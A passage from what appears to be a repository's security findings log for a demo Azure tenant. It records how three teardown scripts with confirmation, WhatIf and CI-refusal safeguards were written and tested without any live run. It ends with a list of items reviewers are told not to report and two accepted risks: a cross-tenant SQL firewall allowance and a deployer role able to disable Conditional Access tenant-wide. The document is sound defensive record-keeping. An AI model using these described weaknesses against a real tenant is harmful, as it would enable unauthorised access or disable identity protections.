claim. Step 1 self-labelled its path `[derived name, per L04]` — the runbook's own
author flagged the path as a guess rather than a path it had verified, and never
followed up.

**Verified absent, not merely undocumented:** before this task, none of the three
paths existed anywhere in the tree. `infra/fabric/teardown-items.ps1` was the ONLY
teardown script ever written for any layer. `infra/entra/` had an apply script
(`apply-entra.ps1`) and a manifest but no teardown counterpart; `infra/purview/`
had `labels.ps1` (create/update only) and no teardown counterpart; `infra/policy/`
did not exist as a directory at all, because **L2 has no apply script either** — it
deploys `infra/bicep/landing-zone/main.bicep` straight from a GitHub Actions step
(`az deployment mg create` in `layer-02-landing-zone.yml`), so L2 was missing two
legs of CLAUDE.md's triplet, not one.

**Found while:** reviewing Task 20's closure of F18 (the sibling CM-6 gap:
sensitivity labels published nowhere). The reviewer first flagged
`infra/purview/teardown.ps1` specifically, as missing. The controller then ran a
repo-wide teardown census rather than accepting a single-file fix, and the census
surfaced two more absent scripts with the identical shape, both referenced by the
same runbook section.

**Every workflow reference to these three paths was a comment, not an executed
step** — `layer-02-landing-zone.yml:12`, `layer-03-entra.yml:10`, and the
commentary in `infra/purview/labels.ps1`'s own header all NAME the path without
ever invoking it — so no pipeline crashed and nothing in CI surfaced the gap. The
exposure is purely operational: an operator performing a real tenant handback, by
following `kill-rebuild.md` § 7 exactly as written, would hit file-not-found on
step 1, and either halt (leaving steps 2–5 undone) or skip ahead past the failure
(leaving the same objects in place while believing the procedure completed). Either
way, the documented outcome — tenant wiped clean for handback — does not occur.
Per `infra/entra/manifest.json` and `infra/bicep/landing-zone/main.bicep`, what
persists in a tenant whose owner has been told it is gone: 5 users, 4 groups, 3 app
registrations and 2 Conditional Access policies; the four Purview sensitivity
labels and their published policy; management group `mls`, its 14 tag/location
policy assignments, and the NIST SP 800-53 R5 initiative assignment.

**Also a direct CLAUDE.md violation, not only an operational gap:** "Every layer
ships a `deploy` path, a `teardown` script, a `verification/` audit script. A layer
without all three is not done." L2, L3 and L4 each failed that rule outright.

**Fix:** author all three scripts, each safe to author without ever touching a
live tenant (hard rule 1: "Authoring code is always allowed; executing deployments
is not") — `-WhatIf`-able, confirming by default, refusing to run in CI, and
idempotent on an already-absent object — plus a Pester suite proving each property
under mocks.

**Closed (Task 25):** all three scripts now exist, mirroring each layer's own
access pattern rather than inventing a new one. `infra/entra/teardown.ps1` reuses
`apply-entra.ps1`'s exact choke points — every Graph call funnels through
`Invoke-GraphApi`/`Invoke-GraphMutation`, never a `Remove-Mg*` cmdlet — and deletes
only what `infra/entra/manifest.json` lists, never a wildcard sweep, in
reverse-dependency order (CA policies, then app registrations, then groups, then
users). `infra/purview/teardown.ps1` reuses `labels.ps1`'s Security & Compliance
surface (`Get-Label`, `Get-LabelPolicy`, and the new `Remove-Label`/
`Remove-LabelPolicy` calls) and removes the published label policy **before** the
four labels — a label still scoped by a live policy cannot be deleted, so the order
is load-bearing, not cosmetic. `infra/policy/teardown.ps1` is new ground, since L2
never had a PowerShell apply script to mirror: it follows the repo's own `az` CLI
convention instead (the same `Invoke-AzCli`/`Invoke-AzMutation` shape
`scripts/bootstrap/02-fabric-capacity.ps1` already uses), checks `$LASTEXITCODE`
explicitly after every `az` call (`$PSNativeCommandUseErrorActionPreference`
defaults to `$false` in `pwsh`, so a failed native command does not throw on its
own), resolves management group `mls`'s name from `infra/bicep/naming.bicep`
exactly the way `scripts/down.ps1`'s `Get-CompanyPrefix` already does rather than
hardcoding `mls`, and removes in order: the 14 tag/location policy assignments,
then the NIST SP 800-53 R5 initiative assignment (at **subscription** scope, per
`main.bicep`'s own comment that the AVM pattern module fans that one assignment out
to the subscription rather than the management group — the other 14 stay at MG
scope), then moves the subscription back to the tenant root, then deletes MG `mls`
— in that order, because a management group with a child subscription will not
delete.

Every script carries the same safety contract: `Invoke-Main` declares
`[CmdletBinding(SupportsShouldProcess, ConfirmImpact = 'High')]`, so `-WhatIf`
enumerates without deleting and confirmation is required by default; a G3 banner
(naming the gate, the exact scope being deleted, and the irreversible consequence —
new label GUIDs, invalidated Entra object IDs, reset policy-compliance data) prints
before any destructive call; each refuses to run when `$env:GITHUB_ACTIONS -eq
'true'` unless `-AllowAutomation` is passed explicitly, and a repo-wide grep
confirms no workflow anywhere passes that switch; an already-absent object is an
informational no-op on every path, never a terminating error; and each ends with
the repo's `if (-not $env:MLS_SKIP_MAIN) { Invoke-Main ... }` guard so Pester can
dot-source it without executing anything.

TDD: 29 new assertions across three new test files — `infra/entra/tests/
teardown.Tests.ps1` (8), `infra/purview/tests/teardown.Tests.ps1` (9), and
`infra/policy/tests/teardown.Tests.ps1` (12, including three direct unit tests of
`Invoke-AzCli`'s own `$LASTEXITCODE` handling against a local `az` stand-in
function, since the script otherwise has no seam to prove a native-command failure
is actually checked rather than silently ignored). All 29 failed before the three
scripts existed (`Invoke-Pester infra/purview/tests,infra/entra/tests,
infra/policy/tests` could not even dot-source them) and all pass after. Each
script's three load-bearing behaviours — the CI refusal, the teardown order, and
the `-WhatIf` no-mutate guarantee — were mutation-tested individually by neutering
exactly that one behaviour, confirming the corresponding test (and only that test)
went red, then restoring the file: 9 mutations total, each isolated to the single
assertion it targeted. One mutation was not single-point by construction:
`infra/entra/teardown.ps1` gates every delete through **two** independent
`ShouldProcess` calls (the `Remove-EntraUser`/`Remove-EntraGroup`/
`Remove-EntraApplication`/`Remove-CaPolicy` wrapper functions each have their own,
on top of `Invoke-GraphMutation`'s), so neutering either layer alone left the
`-WhatIf` no-mutate test green — both layers had to be neutered together before it
went red. That is disclosed here rather than treated as a clean single-point
result: the redundancy is deliberate defence-in-depth (it is also what satisfies
PSScriptAnalyzer's `PSUseShouldProcessForStateChangingFunctions` rule on each
`Remove-*` wrapper, which has a state-changing verb), but it means a single-point
regression in just one of the two layers would not be caught by this test suite
alone — a genuine residual gap, named rather than hidden. PSScriptAnalyzer reports
zero findings at Error or Warning severity on all three new scripts. Full local
suite (`Invoke-Pester -Path scripts,infra,data,verification,compliance`): 798
passed, 0 failed, up from the 769/0 baseline entering this task (the 29-test delta
matches the three new test files exactly).

**Stale-claim sweep after the fix:** `docs/runbooks/kill-rebuild.md` § 7 step 1's
`[derived name, per L04]` marker — the one the brief for this task singled out as
"now wrong" — is corrected to `(F23, Task 25)`. A repo-wide grep for every other
instance of a teardown-script path paired with a non-existence claim
(`does not exist|missing|never written|derived name`, across every `.md`, `.yml`,
`.ps1` and `.bicep` file) turned up exactly one more hit:
`docs/runbooks/layers/L04.md:148`'s `[derived name — master plan says
'G3-gated script' without a path; placed beside the apply script per repo
convention]`. That one is NOT corrected, because it is not the same kind of claim —
it explains why this documentation chose that particular path (the master plan
named no path at all for L4's teardown; this doc picked the convention of placing
it beside the apply script), not that the path is missing, and it remains
accurate now that the file is real. `L02.md`, `L03.md`, the `layer-02-landing-
zone.yml` and `layer-03-entra.yml` header comments, and `infra/purview/labels.ps1`'s
own docstring were all checked directly and already named the correct paths
without any non-existence claim to begin with.

**Not claimed:** none of the three scripts has ever been run against a live
tenant, a live management group, or a live Purview session — per this branch's
constraint (hard rule 1: authoring is always allowed, executing is not), every
assertion above rests on code reading and the mocked Pester suite, never an
end-to-end run. `infra/policy/teardown.ps1`'s NIST-assignment subscription-scope
handling in particular is inferred from `main.bicep`'s own comment describing how
the AVM pattern module fans that one assignment out, not confirmed against a real
`az policy assignment show` response.

**CM-6 register note:** this finding's second-contributor effect on
`compliance/assessment/CM-6.json` (previously recorded with F18 as its sole
contributor) is recorded in that file directly, not only here — see its
`rationale` and `evidence` fields, updated in this same commit.

---

## Deliberately NOT findings — do not report these

- `apps/vuln-lab`'s three seeded CVEs and two CodeQL flaws are intentional fixtures.
  Verified unreachable: ingress DISABLED (not internal — none), never containerised, no
  import edge from any deployed app.
- CA policies shipping as `enabledForReportingButNotEnforced` — deliberate, so a demo
  tenant cannot lock itself out. It IS recorded as an honest gap against 3.5.3, because an
  adopter would inherit it, but it is not a defect to fix here.
- `mcp-tools` `ingressExternal: true` — required; Copilot Studio calls it from the
  internet.
- `costExportStorage`'s `skuName: 'Standard_LRS'` (`infra/bicep/platform/main.bicep:296`)
  — checked as a possible CP-9 gap during the F16–F18 scrub and dismissed. The comment on
  that line already states the rationale ("cheapest redundancy; exports are reproducible
  data") and it holds: the container holds daily Cost Management exports that Azure will
  regenerate from the billing system on the next scheduled run or an on-demand re-export.
  Nothing unique is lost if the account's single-region copy is unavailable, so LRS is the
  right choice for this specific, reproducible dataset — unlike the Azure SQL database
  (F16), which holds seeded operational data with no equivalent regeneration path.

## Deferred — record as an open gap rather than closing

Azure SQL firewall `0.0.0.0-0.0.0.0` (`platform/main.bicep:257-263`). This is the ARM
sentinel for "allow Azure services" — any Azure tenant's resources reach the TDS endpoint
at the network layer. The risk is genuinely lower than it looks:
`azureADOnlyAuthentication: true` (`:247`), no SQL logins, no passwords,
`minimalTlsVersion: '1.2'`. It is NOT an authentication bypass. But it is a cross-tenant
allow that the repo's own NIST initiative would flag, and a possible denial-of-wallet —
serverless resume may trigger at the gateway before Entra auth, which is SUSPECTED and
worth verifying post-deploy. Fixing it properly needs a VNet-integrated workload profile,
a G2 spend decision. F9's SQL auditing makes attempts visible in the interim.

`Policy.ReadWrite.ConditionalAccess` on the deployer (`scripts/bootstrap/01-root-oidc.ps1`,
`$script:DeployerGraphRoles`, consented Graph application role). This role can disable
Conditional Access tenant-wide, not merely author the CA policies L3 actually needs it
for — a materially larger capability than "create/update the two policies in
`infra/entra/manifest.json`". It is retained deliberately, not an oversight:
`infra/entra/apply-entra.ps1` calls `POST`/`PATCH identity/conditionalAccess/policies`
(`:455`, `:468`) to create and update those policies as part of L3's apply step, and
Microsoft Graph exposes a single application role for writing Conditional Access
policies — there is no narrower one to swap to, unlike F8's `Application.ReadWrite.All`
→ `.OwnedBy`, which was a drop-in. The risk is real: a compromised deployer identity (or
a compromised repo with `id-token: write`) could disable every CA policy in the tenant,
which for this demo means MFA/Conditional Access enforcement for the five fictional
admin users goes dark tenant-wide rather than just for one resource. Not fixed here —
there is no cheaper mitigation available than what Task 10 already did to the
co-located `Application.ReadWrite.All` grant. Tracked as an accepted risk rather than a
defect; see F8 in the index above, whose fix note first flagged this in passing.
